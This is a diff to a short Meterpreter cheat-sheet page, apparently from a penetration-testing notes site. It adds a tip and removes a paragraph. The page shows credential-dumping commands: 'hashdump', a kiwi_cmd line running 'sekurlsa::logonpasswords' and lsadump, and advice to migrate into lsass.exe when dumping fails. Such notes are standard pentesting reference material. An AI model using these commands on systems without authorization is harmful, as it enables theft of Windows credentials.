@@ -1,5 +1,9 @@
 # Meterpreter
 
+{% hint style="info" %}
+#### Some times dumping the hashes with `hashdump` or `creds_all` commands wont work. in this case, consider migrating to lsass.exe process and try dumping again.
+{% endhint %}
+
 ### <mark style="color:orange;">Meterpreter Modules</mark>
 
 ```
@@ -26,10 +30,4 @@ kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump
 
 ```
 meterpreter > hashdump
-```
-
-if it failes, inject the meterpreter to the lsass.exe process with migrate command
-
-```
-migrate -N lsass.exe
 ```
